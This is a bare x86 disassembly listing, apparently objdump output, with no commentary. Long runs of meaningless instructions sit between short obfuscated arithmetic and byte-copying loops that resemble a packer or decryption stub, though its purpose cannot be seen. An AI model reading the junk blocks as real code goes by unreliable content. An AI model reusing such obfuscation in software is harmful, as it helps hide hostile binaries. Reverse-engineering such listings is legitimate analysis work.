  40aec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aec4:	jg     0x40af2f
  40aec6:	fstp   DWORD PTR [esi+0x5b06edc]
  40aecc:	leave  
  40aecd:	pop    ds
  40aece:	adc    al,0x4d
  40aed0:	fistp  DWORD PTR [edi+0x1b]
  40aed3:	retf   
  40aed4:	and    eax,0xd6053996
  40aed9:	mov    ecx,DWORD PTR ds:0xb4ac06cf
  40aedf:	push   ds
  40aee0:	or     edx,esp
  40aee2:	lods   eax,DWORD PTR ds:[esi]
  40aee3:	out    dx,al
  40aee4:	imul   edx,ebx,0x72
  40aee7:	push   ss
  40aee8:	mov    edx,0x9bc9e554
  40aeed:	js     0x40af5a
  40aeef:	out    dx,eax
  40aef0:	pop    es
  40aef1:	push   ebp
  40aef2:	iret   
  40aef3:	scas   eax,DWORD PTR es:[edi]
  40aef4:	pop    edx
  40aef5:	mov    dh,0xd0
  40aef7:	cli    
  40aef8:	sbb    al,0xfc
  40aefa:	loope  0x40af0a
  40aefc:	mov    DWORD PTR [ebx+0x7941dce5],eax
  40af02:	mov    ebx,0x3eee939f
  40af07:	sub    dl,BYTE PTR [edi]
  40af09:	push   ds
  40af0a:	inc    ebp
  40af0b:	sub    DWORD PTR [ebx],ebp
  40af0d:	(bad)  
  40af0e:	(bad)  [ebx+0x28]
  40af11:	ins    DWORD PTR es:[edi],dx
  40af12:	xor    BYTE PTR [ecx+0x0],0xae
  40af16:	loop   0x40aeb7
  40af18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af19:	scas   al,BYTE PTR es:[edi]
  40af1a:	inc    ebp
  40af1b:	rcr    BYTE PTR [edx+0x49db4ab],cl
  40af21:	adc    BYTE PTR [edx-0x5c580042],0x6e
  40af28:	psubw  mm6,QWORD PTR ds:0x7b6d7ad6
  40af2f:	jmp    0x5f3b4826
  40af34:	mov    al,ds:0x6d27375
  40af39:	inc    ecx
  40af3a:	xor    esp,esi
  40af3c:	test   eax,0x1b6a78fc
  40af41:	pop    edi
  40af42:	shl    BYTE PTR [eax-0x62fb24],cl
  40af48:	dec    ebx
  40af49:	pop    esp
  40af4a:	jge    0x40aeff
  40af4c:	mov    BYTE PTR [ecx],bh
  40af4e:	popf   
  40af4f:	dec    ecx
  40af50:	fnsave [edi]
  40af52:	fmul   DWORD PTR [ecx+esi*8]
  40af55:	push   0xc1a98a80
  40af5a:	aam    0x48
  40af5c:	call   0xd481:0x86958b6f
  40af63:	adc    al,0xbd
  40af65:	mov    eax,0x3cbf3d8e
  40af6a:	test   al,0xea
  40af6c:	push   cs
  40af6d:	cmp    eax,0x56d9b96a
  40af72:	popa   
  40af73:	sahf   
  40af74:	rol    ah,1
  40af76:	out    0xd2,eax
  40af78:	mov    esp,0x963da45
  40af7d:	bound  ebp,QWORD PTR [edx-0x3e]
  40af80:	and    al,0x85
  40af82:	mov    eax,0x9fa19823
  40af87:	sti    
  40af88:	inc    eax
  40af89:	push   ebx
  40af8a:	add    esi,esi
  40af8c:	dec    eax
  40af8d:	icebp  
  40af8e:	ja     0x40afea
  40af90:	retf   
  40af91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af92:	call   0x3ede:0xf137c242
  40af99:	push   edx
  40af9a:	pop    edx
  40af9b:	cli    
  40af9c:	inc    edx
  40af9d:	mov    edi,0x2efeeb66
  40afa2:	pop    es
  40afa3:	hlt    
  40afa4:	xchg   esp,eax
  40afa5:	cmp    DWORD PTR [edx+0x37c32bf1],0x88e77748
  40afaf:	xor    DWORD PTR [edi-0x5],esi
  40afb2:	stos   DWORD PTR es:[edi],eax
  40afb3:	or     eax,0xa5694e24
  40afb8:	cmp    ebx,esp
  40afba:	or     ecx,esp
  40afbc:	enter  0xe2ec,0x1e
  40afc0:	pop    esi
  40afc1:	mov    ebp,0x1b36c639
  40afc6:	mov    bh,0x35
  40afc8:	inc    ecx
  40afc9:	mov    esi,0x847a7157
  40afce:	dec    esp
  40afcf:	mov    ch,0x21
  40afd1:	ret    
  40afd2:	mov    dh,0xdb
  40afd4:	and    al,0xbb
  40afd6:	sbb    ebx,ecx
  40afd8:	repnz outs dx,BYTE PTR ds:[esi]
  40afda:	xchg   esp,eax
  40afdb:	dec    ebx
  40afdc:	inc    ecx
  40afdd:	jo     0x40b040
  40afdf:	daa    
  40afe0:	test   BYTE PTR [edi-0x74f7b9e0],bl
  40afe6:	pop    ebp
  40afe7:	loopne 0x40aff8
  40afe9:	scas   eax,DWORD PTR es:[edi]
  40afea:	ror    DWORD PTR [ebx-0x2ccc1ba3],cl
  40aff0:	sub    edx,0x26bd
  40aff6:	add    eax,ecx
  40aff8:	and    edx,0x7126
  40affe:	mov    ebx,ecx
  40b000:	sub    ebx,edx
  40b002:	mov    edx,DWORD PTR [ebp-0x18]
  40b005:	sub    eax,edx
  40b007:	mov    edx,DWORD PTR [ebp-0x14]
  40b00a:	sub    eax,edx
  40b00c:	mov    edx,DWORD PTR [ebp+0xc]
  40b00f:	mov    dl,BYTE PTR [ebx+edx*1+0x16c0]
  40b016:	mov    BYTE PTR [eax-0xbb5],dl
  40b01c:	mov    eax,DWORD PTR [ebp-0x10]
  40b01f:	xor    eax,0xffffe1ce
  40b024:	add    eax,DWORD PTR [ebp-0xc]
  40b027:	xor    edx,edx
  40b029:	and    eax,0x6d33
  40b02e:	lea    ecx,[ecx+eax*1-0x6520]
  40b035:	mov    eax,DWORD PTR [ebp+0x8]
  40b038:	mov    ebx,DWORD PTR [ebp-0x4]
  40b03b:	add    eax,edi
  40b03d:	div    ebx
  40b03f:	mov    edx,DWORD PTR [ebp-0x8]
  40b042:	mov    ebx,0x940a7
  40b047:	sub    eax,edx
  40b049:	xor    edx,edx
  40b04b:	div    ebx
  40b04d:	add    eax,esi
  40b04f:	cmp    ecx,eax
  40b051:	jb     0x40aa71
  40b057:	xor    ebx,ebx
  40b059:	inc    ebx
  40b05a:	mov    DWORD PTR [ebp+0xc],0x77bd
  40b061:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40b068:	mov    DWORD PTR [ebp-0x8],0x4738
  40b06f:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40b076:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40b07d:	mov    DWORD PTR [ebp-0x14],0x64ec
  40b084:	mov    DWORD PTR [ebp-0x18],0x1984
  40b08b:	mov    DWORD PTR [ebp-0x1c],0x293
  40b092:	mov    eax,DWORD PTR [ebp+0x8]
  40b095:	mov    ecx,DWORD PTR [ebp+0xc]
  40b098:	add    eax,0x1ef2
  40b09d:	and    eax,ecx
  40b09f:	xor    eax,0x7240
  40b0a4:	mov    ecx,0x7aaa
  40b0a9:	sub    ecx,eax
  40b0ab:	mov    DWORD PTR [ebp+0xc],0x8d3
  40b0b2:	mov    DWORD PTR [ebp+0x8],0x2392
  40b0b9:	mov    DWORD PTR [ebp-0x20],ebx
  40b0bc:	mov    DWORD PTR [ebp-0x24],0x338f
  40b0c3:	mov    DWORD PTR [ebp-0x28],0x61c9
  40b0ca:	mov    eax,DWORD PTR [ebp+0x8]
  40b0cd:	mov    edx,DWORD PTR [ebp+0xc]
  40b0d0:	imul   eax,edx
  40b0d3:	xor    eax,0x40a0
  40b0d8:	or     eax,0x1a48
  40b0dd:	xor    eax,0x139ddb0
  40b0e2:	mov    esi,ecx
  40b0e4:	jmp    0x40b37b
  40b0e9:	stos   BYTE PTR es:[edi],al
  40b0ea:	(bad)  
  40b0eb:	mov    ss,WORD PTR [esi-0x355674c]
  40b0f1:	sub    BYTE PTR [edx],dh
  40b0f3:	inc    eax
  40b0f4:	fstp   st(2)
  40b0f6:	jg     0x40b154
  40b0f8:	rol    edx,1
  40b0fa:	scas   eax,DWORD PTR es:[edi]
  40b0fb:	mov    esi,0xbec2a9be
  40b100:	mov    esi,0xd933f3e5
  40b105:	fcomp  QWORD PTR [esi+0x14]
  40b108:	popf   
  40b109:	mov    ebx,0xbfd8cac9
  40b10e:	push   ss
  40b10f:	lods   eax,DWORD PTR ds:[esi]
  40b110:	pop    esi
  40b111:	rcr    al,0x82
  40b114:	out    0x8,eax
  40b116:	lods   eax,DWORD PTR ds:[esi]
  40b117:	cmp    al,0x61
  40b119:	xor    al,0x53
  40b11b:	es (bad) 
  40b11d:	jne    0x40b132
  40b11f:	mov    eax,0xc9734816
  40b124:	ror    DWORD PTR [ecx],0xe2
  40b127:	mov    ah,0x56
  40b129:	fldcw  WORD PTR [esi+eax*4-0x278dddf5]
  40b130:	push   edi
  40b131:	in     eax,dx
  40b132:	fs mov esp,0x43a767e3
  40b138:	xchg   edx,eax
  40b139:	and    eax,0x6364323b
  40b13e:	mov    dl,0xee
  40b140:	lods   al,BYTE PTR ds:[esi]
  40b141:	and    ebp,DWORD PTR [ebx-0x36]
  40b144:	jg     0x40b0e9
  40b146:	clc    
  40b147:	sub    DWORD PTR [ebx],esi
  40b149:	jl     0x40b0e0
  40b14b:	cld    
  40b14c:	mov    al,0x5d
  40b14e:	pop    esp
  40b14f:	stos   DWORD PTR es:[edi],eax
  40b150:	sahf   
  40b151:	retf   0x3fac
  40b154:	sub    cl,BYTE PTR [edx-0xfea6b5a]
  40b15a:	lock mov eax,0xb9aa7ec2
  40b160:	pop    edx
  40b161:	jl     0x40b182
  40b163:	inc    esp
  40b164:	popf   
  40b165:	loopne 0x40b188
  40b167:	mov    ah,0xd1
  40b169:	push   ds
  40b16a:	push   ebp
  40b16b:	es xchg ecx,eax
  40b16d:	pop    eax
  40b16e:	ins    BYTE PTR es:[edi],dx
  40b16f:	dec    esi
  40b170:	call   0x790f:0x17d16a74
  40b177:	leave  
  40b178:	shr    ah,cl
  40b17a:	cli    
  40b17b:	rcr    BYTE PTR [ecx],0x29
  40b17e:	mov    ecx,0x7bfc24df
  40b183:	jbe    0x40b180
  40b185:	xor    al,0x88
  40b187:	xor    dl,BYTE PTR [edi]
  40b189:	cs push edi
  40b18b:	cs mov ch,0xe8
  40b18e:	stc    
  40b18f:	scas   al,BYTE PTR es:[edi]
  40b190:	pop    esi
  40b191:	je     0x40b19e
  40b193:	sbb    cl,dl
  40b195:	push   ss
  40b196:	lahf   
  40b197:	pop    edx
  40b198:	out    0xe6,eax
  40b19a:	push   0x4bda1a6f
  40b19f:	jg     0x40b1e6
  40b1a1:	daa    
  40b1a2:	jbe    0x40b207
  40b1a4:	sbb    DWORD PTR [edx],ecx
  40b1a6:	xor    al,0xb9
  40b1a8:	mov    BYTE PTR [ecx-0x7d26bb5a],dl
  40b1ae:	pop    es
  40b1af:	sbb    DWORD PTR [edi+0x1deed3e],0xa41a6fb9
  40b1b9:	push   0x5c
  40b1bb:	(bad)  
  40b1bc:	hlt    
  40b1bd:	cmp    bh,BYTE PTR [edx]
  40b1bf:	jae    0x40b1fb
  40b1c1:	popf   
  40b1c2:	fldenv [ebx]
  40b1c4:	test   eax,0x1ba09b89
  40b1c9:	xchg   ebp,eax
  40b1ca:	hlt    
  40b1cb:	(bad)  
  40b1cc:	fild   DWORD PTR [edx]
  40b1ce:	mov    al,0x80
  40b1d0:	or     ch,bh
  40b1d2:	out    dx,al
  40b1d3:	mov    ds:0x84293d6f,eax
  40b1d8:	jno    0x40b1e4
  40b1da:	fwait
  40b1db:	jl     0x40b19d
  40b1dd:	(bad)  
  40b1de:	dec    edx
  40b1df:	loopne 0x40b186
  40b1e1:	or     dh,dl
  40b1e3:	popf   
  40b1e4:	cwde   
  40b1e5:	fcom   st(6)
  40b1e7:	dec    eax
  40b1e8:	push   edi
  40b1e9:	sub    BYTE PTR [edx],al
  40b1eb:	cmp    eax,0xd4b0e824
  40b1f0:	jns    0x40b204
  40b1f2:	je     0x40b207
  40b1f4:	sub    esi,ebp
  40b1f6:	popf   
  40b1f7:	mov    ah,dl
  40b1f9:	icebp  
  40b1fa:	ret    
  40b1fb:	pop    ebx
  40b1fc:	sub    eax,0x756941ce
  40b201:	and    BYTE PTR [edx-0x33],al
  40b204:	xor    dh,bh
  40b206:	pop    ds
  40b207:	dec    edx
  40b208:	pop    ebx
  40b209:	retf   0x7264
  40b20c:	loopne 0x40b270
  40b20e:	pop    ecx
  40b20f:	scas   al,BYTE PTR es:[edi]
  40b210:	shr    BYTE PTR [ebx+0x2a],1
  40b213:	or     BYTE PTR [ecx],dh
  40b215:	adc    BYTE PTR [ecx],ah
  40b217:	rcr    BYTE PTR [eax],1
  40b219:	mov    al,ds:0xf3797fe
  40b21e:	sub    DWORD PTR [edx],0x1a
  40b221:	in     eax,0xd6
  40b223:	adc    ebp,DWORD PTR ds:0x4e56c8
  40b229:	push   es
  40b22a:	cmp    bl,ch
  40b22c:	add    eax,0x2582a5d1
  40b231:	mov    ch,BYTE PTR [ebp-0xd5e854c]
  40b237:	cmp    eax,0x57e55e62
  40b23c:	pop    cx
  40b23f:	nop
  40b240:	cli    
  40b241:	or     BYTE PTR [edx+0x1464c0bf],cl
  40b247:	mov    al,0x60
  40b249:	push   ebp
  40b24a:	jecxz  0x40b258
  40b24c:	into   
  40b24d:	sar    DWORD PTR [esi-0x4d8bcfb0],cl
  40b253:	sahf   
  40b254:	test   eax,ebp
  40b256:	fnstsw WORD PTR [edx+0x255db5d9]
  40b25c:	jb     0x40b216
  40b25e:	pop    esp
  40b25f:	pop    esi
  40b260:	jmp    0x5f82:0x9763f876
  40b267:	sar    DWORD PTR [esi-0x72f78b9e],1
  40b26d:	inc    edx
  40b26e:	outs   dx,DWORD PTR ds:[esi]
  40b26f:	pop    ebx
  40b270:	mov    edi,0x7348eacd
  40b275:	pop    edx
  40b276:	jnp    0x40b28b
  40b278:	test   BYTE PTR [eax+0x4e],0xff
  40b27c:	cdq    
  40b27d:	ins    BYTE PTR es:[edi],dx
  40b27e:	sti    
  40b27f:	adc    cx,WORD PTR [eax-0x11f7d5d6]
  40b286:	pop    esp
  40b287:	scas   al,BYTE PTR es:[edi]
  40b288:	fsub   QWORD PTR [ebx-0x749ffb6f]
  40b28e:	jae    0x40b27e
  40b290:	iret   
  40b291:	push   0x63
  40b293:	mov    ecx,0xc4788285
  40b298:	rcl    DWORD PTR [esi-0x42],0xf7
  40b29c:	sbb    ecx,DWORD PTR [edx]
  40b29e:	xchg   ecx,eax
  40b29f:	pop    es
  40b2a0:	lods   al,BYTE PTR ds:[esi]
  40b2a1:	clc    
  40b2a2:	call   0x418ddc4a
  40b2a7:	sahf   
  40b2a8:	test   BYTE PTR [eax+esi*1-0x1c],ch
  40b2ac:	out    dx,eax
  40b2ad:	ja     0x40b2db
  40b2af:	mov    cl,0x37
  40b2b1:	outs   dx,DWORD PTR ds:[esi]
  40b2b2:	xor    ebp,esp
  40b2b4:	and    al,0xb9
  40b2b6:	nop
  40b2b7:	ins    BYTE PTR es:[edi],dx
  40b2b8:	pop    edi
  40b2b9:	xchg   DWORD PTR [ebx],ebx
  40b2bb:	int3   
  40b2bc:	mov    edx,0x56d88e39
  40b2c1:	retf   0x57c3
  40b2c4:	xchg   edi,eax
  40b2c5:	fld    TBYTE PTR [esi+0x11e55d02]
  40b2cb:	sbb    BYTE PTR [edi+0x15],bl
  40b2ce:	pop    ebp
  40b2cf:	mov    dh,0x57
  40b2d1:	xor    eax,0x7452bee3
  40b2d6:	aam    0xb7
  40b2d8:	popf   
  40b2d9:	enter  0xdd4,0xf9
  40b2dd:	mov    ds,WORD PTR [esi+0x482bcc14]
  40b2e3:	sub    eax,0xe2c0df36
  40b2e8:	iret   
  40b2e9:	mov    ebp,0xe52b449e
  40b2ee:	push   esp
  40b2ef:	lods   al,BYTE PTR ds:[esi]
  40b2f0:	leave  
  40b2f1:	out    dx,eax
  40b2f2:	mov    ebx,0xc48b456e
  40b2f7:	jo     0x40b33f
  40b2f9:	adc    BYTE PTR [ecx],0xcf
  40b2fc:	fmul   QWORD PTR [ebx]
  40b2fe:	loop   0x40b2f9
  40b300:	push   edx
  40b301:	add    eax,0x2e81706a
  40b306:	pop    ecx
  40b307:	call   0x4040a1f5
  40b30c:	push   0xffffffa4
  40b30e:	push   ebx
  40b30f:	jp     0x40b34f
  40b311:	fs pop esp
  40b313:	ds pop ss
  40b315:	stos   DWORD PTR es:[edi],eax
  40b316:	sub    ah,BYTE PTR cs:[eax-0x4e]
  40b31a:	pop    ebp
  40b31b:	bound  edi,QWORD PTR [edi+0x55]
  40b31e:	icebp  
  40b31f:	pop    es
  40b320:	fwait
  40b321:	mov    ebp,0xbcc0434a
  40b326:	push   eax
  40b327:	stos   BYTE PTR es:[edi],al
  40b328:	jo     0x40b371
  40b32a:	outs   dx,DWORD PTR ds:[esi]
  40b32b:	and    dl,BYTE PTR [ebx]
  40b32d:	or     DWORD PTR [esi-0x4d2c91f8],edx
  40b333:	adc    esi,ebx
  40b335:	mov    eax,ds:0x456aa36f
  40b33a:	sub    al,0x76
  40b33c:	in     al,dx
  40b33d:	popf   
  40b33e:	mov    ch,0xba
  40b340:	loope  0x40b334
  40b342:	cli    
  40b343:	inc    ebp
  40b344:	and    BYTE PTR [eax*4+0x2ec04481],dh
  40b34b:	cdq    
  40b34c:	faddp  st(2),st
  40b34e:	(bad)  
  40b34f:	in     eax,0xb7
  40b351:	scas   al,BYTE PTR es:[edi]
  40b352:	mov    BYTE PTR [edx+0x2ae4ca9],al
  40b358:	pop    edi
  40b359:	mov    ebx,0x12389901
  40b35e:	xor    eax,0x4979d11e
  40b363:	mov    al,0x93
  40b365:	mov    ebp,0xbdd3fee4
  40b36a:	in     al,dx
  40b36b:	retf   0x93ed
  40b36e:	shl    BYTE PTR [esi],cl
  40b370:	xchg   edi,eax
  40b371:	and    cl,BYTE PTR ds:0x4b158bed
  40b377:	leave  
  40b378:	pop    ds
  40b379:	clc    
  40b37a:	(bad)  
  40b37b:	sub    esi,eax
  40b37d:	mov    eax,DWORD PTR [ebp-0x28]
  40b380:	mov    edx,DWORD PTR [ebp-0x24]
  40b383:	mov    edi,DWORD PTR [ebp-0x20]
  40b386:	or     eax,0x1cc2
  40b38b:	sub    eax,edx
  40b38d:	xor    edx,edx
  40b38f:	div    edi
  40b391:	mov    edx,DWORD PTR ds:0x422708
  40b397:	mov    edx,DWORD PTR [edx+0x1d4]
  40b39d:	sub    edx,eax
  40b39f:	mov    eax,DWORD PTR [ebp+0x10]
  40b3a2:	mov    al,BYTE PTR [esi+eax*1]
  40b3a5:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40b3ac:	mov    eax,DWORD PTR [ebp-0x1c]
  40b3af:	mov    edx,DWORD PTR [ebp-0x18]
  40b3b2:	imul   eax,edx
  40b3b5:	mov    edx,DWORD PTR [ebp-0x14]
  40b3b8:	imul   eax,eax,0x262b
  40b3be:	or     eax,edx
  40b3c0:	jmp    0x40b657
  40b3c5:	dec    ecx
  40b3c6:	mov    bl,0x7d
  40b3c8:	push   esp
  40b3c9:	mov    bh,0x74
  40b3cb:	pushf  
  40b3cc:	mov    esp,0xe3db5995
  40b3d1:	xor    eax,0xadd15ac8
  40b3d6:	mov    bl,0xbe
  40b3d8:	mov    esi,0xbebec2a9
  40b3dd:	jne    0x40b3b2
  40b3df:	cmp    ecx,ebx
  40b3e1:	test   eax,0xf8c51c4f
  40b3e6:	not    BYTE PTR [ecx]
  40b3e8:	out    dx,al
  40b3e9:	imul   edx,DWORD PTR [edi-0x25],0x4d44a928
  40b3f0:	addr16 fs in al,0x6f
  40b3f4:	fcomp  st(4)
  40b3f6:	push   edi
  40b3f7:	or     eax,0xa157b54a
  40b3fc:	cmp    ah,0x7e
  40b3ff:	dec    edi
  40b400:	int    0x45
  40b402:	adc    al,0xa5
  40b404:	cdq    
  40b405:	pop    ebx
  40b406:	scas   al,BYTE PTR es:[edi]
  40b407:	push   0xa
  40b409:	out    0xd1,al
  40b40b:	(bad)  
  40b40c:	fild   DWORD PTR [esi]
  40b40e:	mov    WORD PTR [edi-0x40e1f21a],ss
  40b414:	imul   ebp,ecx,0xf3605905
  40b41a:	test   BYTE PTR [edx+0x7e],0x28
  40b41e:	ins    BYTE PTR es:[edi],dx
  40b41f:	arpl   WORD PTR [edx-0x10767580],dx
  40b425:	in     al,dx
  40b426:	dec    ebp
  40b427:	enter  0xe3ed,0x37
  40b42b:	mov    BYTE PTR [eax],ah
  40b42d:	push   es
  40b42e:	ja     0x40b422
  40b430:	cmp    eax,0x67cc452a
  40b435:	or     edi,edx
  40b437:	fst    st(7)
  40b439:	lea    edi,[edx]
  40b43b:	jecxz  0x40b4b0
  40b43d:	dec    bx
  40b43f:	cmp    eax,0xc84ace57
  40b444:	mov    ds:0xbad3026d,eax
  40b449:	pop    ecx
  40b44a:	fcom   DWORD PTR [eax]
  40b44c:	bound  edx,QWORD PTR [edi-0x7c]
  40b44f:	sbb    DWORD PTR [ebx+esi*2],0x2aea6461
  40b456:	call   0x9f36:0x42d3bf37
  40b45d:	sbb    WORD PTR [ecx+eiz*1+0x2d],di
  40b462:	push   esp
  40b463:	loope  0x40b4a4
  40b465:	jmp    0x40b42d
  40b467:	aad    0x15
  40b469:	aas    
  40b46a:	or     dl,BYTE PTR [ebx+0x39]
  40b46d:	xor    ch,al
  40b46f:	cs cli 
  40b471:	cmp    cl,BYTE PTR [esi+0xb]
  40b474:	cli    
  40b475:	test   eax,0x77eab8eb
  40b47a:	cmp    BYTE PTR ds:0x2ee7af,bh
  40b480:	sbb    eax,0xa06db9aa
  40b485:	int3   
  40b486:	jnp    0x40b4c1
  40b488:	sahf   
  40b489:	gs cs mov esi,0x5e2d2e97
  40b490:	mov    dh,0x5e
  40b492:	mov    ecx,0xc3d086f0
  40b497:	iret   
  40b498:	inc    ecx
  40b499:	test   al,0xc9
  40b49b:	je     0x40b429
  40b49d:	sti    
  40b49e:	fidiv  DWORD PTR [ecx-0x5d]
  40b4a1:	out    dx,al
  40b4a2:	sub    edi,DWORD PTR [esi]
  40b4a4:	aad    0x99
  40b4a6:	enter  0xfd91,0x93
  40b4aa:	sti    
  40b4ab:	mov    al,0x9d
  40b4ad:	cmp    ebx,DWORD PTR [ecx]
  40b4af:	test   eax,0x3fa0b6d5
  40b4b4:	scas   al,BYTE PTR es:[edi]
  40b4b5:	jne    0x40b51e
  40b4b7:	and    ecx,0x653b44b7
  40b4bd:	sbb    bh,ah
  40b4bf:	add    eax,0xa81e2a19
  40b4c4:	and    eax,0x589f8e5a
  40b4c9:	or     ch,dl
  40b4cb:	mov    ah,0x98
  40b4cd:	rcl    eax,1
  40b4cf:	ins    BYTE PTR es:[edi],dx
  40b4d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4d1:	or     cl,dl
  40b4d3:	lods   al,BYTE PTR ds:[esi]
  40b4d4:	xor    bl,BYTE PTR [esp+ebx*4]
  40b4d7:	mov    ah,0xd4
  40b4d9:	mov    bl,0x23
  40b4db:	pop    ss
  40b4dc:	cmp    bh,BYTE PTR [edi]
  40b4de:	jne    0x40b4d8
  40b4e0:	push   ebx
  40b4e1:	test   BYTE PTR [edx],ah
  40b4e3:	mov    ebx,DWORD PTR [esi]
  40b4e5:	pop    eax
  40b4e6:	push   ecx
  40b4e7:	enter  0x40b5,0x8d
  40b4eb:	inc    ebp
  40b4ec:	inc    eax
  40b4ed:	stos   DWORD PTR es:[edi],eax
  40b4ee:	and    DWORD PTR [ebx],esp
  40b4f0:	jmp    0x47b4c23f
  40b4f5:	push   esp
  40b4f6:	addr16 mov bh,0xa8
  40b4f9:	dec    eax
  40b4fa:	jmp    0xccb:0x16f4545c
  40b501:	sti    
  40b502:	aas    
  40b503:	popf   
  40b504:	add    dh,BYTE PTR [ecx+eax*2-0x7036bfd5]
  40b50b:	push   edx
  40b50c:	and    DWORD PTR [edi-0x6d],esi
  40b50f:	loope  0x40b559
  40b511:	jno    0x40b580
  40b513:	shl    DWORD PTR [esi],0xe4
  40b516:	in     al,dx
  40b517:	pop    ecx
  40b518:	sub    esi,DWORD PTR [eax-0x5f]
  40b51b:	or     al,0x2d
  40b51d:	inc    ebp
  40b51e:	mov    ebx,0xfebac2f0
  40b523:	xchg   ecx,eax
  40b524:	into   
  40b525:	jno    0x40b540
  40b527:	or     BYTE PTR [esi+0x237614a0],ch
  40b52d:	test   ch,ah
  40b52f:	pop    edi
  40b530:	xor    ah,ch
  40b532:	scas   al,BYTE PTR es:[edi]
  40b533:	inc    esi
  40b534:	sbb    eax,0xa37d5944
  40b539:	rcr    DWORD PTR [edi-0x3faa7ba2],1
  40b53f:	fsubr  QWORD PTR [eax-0x30]
  40b542:	inc    edx
  40b543:	and    esp,esi
  40b545:	or     eax,0x9d8a792d
  40b54a:	dec    eax
  40b54b:	xor    al,0xe7
  40b54d:	hlt    
  40b54e:	and    ebx,DWORD PTR [esi-0x599c611]
  40b554:	mov    al,ds:0xfe3ac277
  40b559:	cmp    ch,dl
  40b55b:	in     eax,0x3e
  40b55d:	outs   dx,DWORD PTR ds:[esi]
  40b55e:	cmp    ebx,DWORD PTR [ecx]
  40b560:	push   ebx
  40b561:	ror    dl,cl
  40b563:	les    edx,FWORD PTR ds:0x98149f9c
  40b569:	push   cs
  40b56a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b56b:	pop    ebp
  40b56c:	dec    ebp
  40b56d:	mov    ah,0x8b
  40b56f:	dec    esp
  40b571:	fisub  WORD PTR [ebp+0x1e38e633]
  40b577:	jno    0x40b4f9
  40b579:	fcom   st(0)
  40b57b:	xchg   ebx,eax
  40b57c:	stos   DWORD PTR es:[edi],eax
  40b57d:	fwait
  40b57e:	jge    0x40b5d3
  40b580:	es daa 
  40b582:	xor    eax,0x6c2d68b0
  40b587:	sbb    eax,0x68172f7f
  40b58c:	push   ecx
  40b58d:	xchg   edx,eax
  40b58e:	gs jg  0x40b5f8
  40b591:	mov    esp,0xfdf92ad3
  40b596:	scas   al,BYTE PTR es:[edi]
  40b597:	mov    ebx,0x43ef8480
  40b59c:	jae    0x40b544
  40b59e:	ins    DWORD PTR es:[edi],dx
  40b59f:	jl     0x40b5fa
  40b5a1:	icebp  
  40b5a2:	mov    dh,0x19
  40b5a4:	adc    al,0xd7
  40b5a6:	test   eax,0xa2b034d2
  40b5ab:	mov    dl,0x88
  40b5ad:	inc    ecx
  40b5ae:	or     eax,0x803cfea4
  40b5b3:	cmp    bl,ah
  40b5b5:	push   cs
  40b5b6:	sub    bl,dl
  40b5b8:	cld    
  40b5b9:	pop    ds
  40b5ba:	adc    BYTE PTR [ecx+0x63224645],al
  40b5c0:	jbe    0x40b629
  40b5c2:	pop    ebx
  40b5c3:	pushf  
  40b5c4:	jno    0x40b5e8
  40b5c6:	add    bl,BYTE PTR [ebx]
  40b5c8:	dec    edx
  40b5c9:	jns    0x40b575
  40b5cb:	retf   
  40b5cc:	sbb    dl,cl
  40b5ce:	ss test eax,0x4e308eb5
  40b5d4:	mov    ds:0x9e46f8c4,eax
  40b5d9:	outs   dx,DWORD PTR ds:[esi]
  40b5da:	sar    DWORD PTR [eax],cl
  40b5dc:	fdivr  QWORD PTR [esp+ebp*2]
  40b5df:	dec    edx
  40b5e0:	adc    esp,DWORD PTR ds:0xec21bf29
  40b5e6:	not    BYTE PTR [ecx-0x4def6122]
  40b5ec:	xchg   BYTE PTR [esi-0xc],al
  40b5ef:	adc    eax,0x2c612
  40b5f4:	sbb    ecx,0xb239c587
  40b5fa:	jle    0x40b5c2
  40b5fc:	jb     0x40b5f3
  40b5fe:	(bad)  
  40b5ff:	xlat   BYTE PTR ds:[ebx]
  40b600:	xchg   esp,eax
  40b601:	push   edx
  40b602:	call   0x6f626135
  40b607:	fst    QWORD PTR [eax+0xc]
  40b60a:	adc    ah,BYTE PTR [edx]
  40b60c:	pop    ss
  40b60d:	or     ebx,DWORD PTR [ebp+0x3d0332d0]
  40b613:	jb     0x40b683
  40b615:	inc    edi
  40b616:	and    eax,0xf2c5fe22
  40b61b:	pop    edx
  40b61c:	add    cl,BYTE PTR [edi]
  40b61e:	or     dh,BYTE PTR [ecx-0x24]
  40b621:	popf   
  40b622:	jecxz  0x40b5c5
  40b624:	hlt    
  40b625:	sar    eax,cl
  40b627:	mov    bl,0x7a
  40b629:	add    cl,BYTE PTR [ebp+0x1351e315]
  40b62f:	outs   dx,BYTE PTR ds:[esi]
  40b630:	push   cs
  40b631:	loop   0x40b603
  40b633:	popa   
  40b634:	fcmovu st,st(7)
  40b636:	push   cs
  40b637:	outs   dx,BYTE PTR ds:[esi]
  40b638:	repnz stos DWORD PTR es:[edi],eax
  40b63a:	dec    edi
  40b63b:	xchg   ch,dh
  40b63d:	into   
  40b63e:	dec    ebp
  40b63f:	lock (bad) 
  40b642:	inc    ebp
  40b643:	adc    al,0x6
  40b645:	sbb    ch,0xba
  40b648:	dec    esi
  40b649:	jnp    0x40b679
  40b64b:	xchg   esp,eax
  40b64c:	(bad)
  40b64f:	and    eax,0xb8445ec
  40b654:	int3   
  40b655:	jbe    0x40b678
  40b657:	mov    edx,DWORD PTR [ebp-0x10]
  40b65a:	or     eax,edx
  40b65c:	xor    eax,0x59f6
  40b661:	lea    ecx,[ecx+eax*1+0x350559e6]
  40b668:	mov    eax,DWORD PTR [ebp-0xc]
  40b66b:	and    eax,0xddc
  40b670:	add    eax,DWORD PTR [ebp-0x8]
  40b673:	xor    eax,0x46e3
  40b678:	add    eax,0x50eb
  40b67d:	cmp    ecx,eax
  40b67f:	jne    0x40b0ab
  40b685:	pop    edi
  40b686:	pop    esi
  40b687:	pop    ebx
  40b688:	leave  
  40b689:	ret    0xc
  40b68c:	push   ebp
  40b68d:	mov    ebp,esp
  40b68f:	sub    esp,0xec
  40b695:	push   ebx
  40b696:	push   esi
  40b697:	mov    DWORD PTR [ebp-0x8],0x548e
  40b69e:	jmp    0x40baa9
  40b6a3:	or     DWORD PTR [edx],ebx
